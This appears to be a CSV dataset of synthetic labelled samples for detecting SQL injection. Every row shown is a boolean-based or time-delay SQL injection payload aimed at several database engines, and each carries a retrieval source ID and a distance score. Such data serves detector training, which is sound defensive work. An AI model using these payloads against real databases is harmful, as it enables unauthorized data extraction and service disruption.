id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001174,4.743683992599614
CTGAN_000002,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000160,6.93507576709711
CTGAN_000003,attack,boolean,"-8060""  )   where 5290  =  5290 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000604,6.084698248855142
CTGAN_000004,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R000710,5.50072438492116
CTGAN_000005,attack,boolean,"-7329""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""borw"" like ""borw",nearest_attack_euclidean,R000554,6.044047082094313
CTGAN_000006,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R001162,5.83853249727113
CTGAN_000007,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R000516,5.111274102953456
CTGAN_000008,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'mizk'  =  'mizk,nearest_attack_euclidean,R000851,6.148194111510964
CTGAN_000009,attack,boolean,"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",nearest_attack_euclidean,R000489,5.897544864002834
CTGAN_000010,attack,boolean,"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm",nearest_attack_euclidean,R000195,4.765418780051652
CTGAN_000011,attack,boolean,"1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'",nearest_attack_euclidean,R000723,6.605754238989358
CTGAN_000012,attack,boolean,"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000715,5.631701407719731
CTGAN_000013,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'mizk'  =  'mizk,nearest_attack_euclidean,R000851,5.831217816850579
CTGAN_000014,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R001036,5.915504035708528
CTGAN_000015,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",nearest_attack_euclidean,R001284,6.096397451294754
CTGAN_000016,attack,boolean,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",nearest_attack_euclidean,R001019,5.441902835762751
CTGAN_000017,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000309,7.048516215397659
CTGAN_000018,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R001516,7.567691832778222
CTGAN_000019,attack,boolean,"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000223,6.933316908165475
CTGAN_000020,attack,boolean,1   )    )    as wrhe where 6120  =  6120 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000684,4.419182983498412
CTGAN_000021,attack,boolean,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'dfsj'  =  'dfsj",nearest_attack_euclidean,R001006,5.211883790649588
CTGAN_000022,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'mizk'  =  'mizk,nearest_attack_euclidean,R000851,4.4636520104646165
CTGAN_000023,attack,boolean,1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,nearest_attack_euclidean,R001252,3.423327543846937
CTGAN_000024,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001321,5.449190680073427
CTGAN_000025,attack,boolean,"1%"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001541,7.0057024947128905
CTGAN_000026,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000309,4.708213945467452
CTGAN_000027,attack,boolean,"-1631%""  )   or elt  (  8285  =  1709,1709  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000416,4.772242266004484
CTGAN_000028,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R001358,5.679310902231024
CTGAN_000029,attack,boolean,"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000715,6.550656129444939
CTGAN_000030,attack,boolean,"1  )   as wvpl where 9791  =  9791 and make_set  (  3491  =  9067,9067  )  --",nearest_attack_euclidean,R000776,4.994620182835766
CTGAN_000031,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,nearest_attack_euclidean,R001219,5.6574434356313805
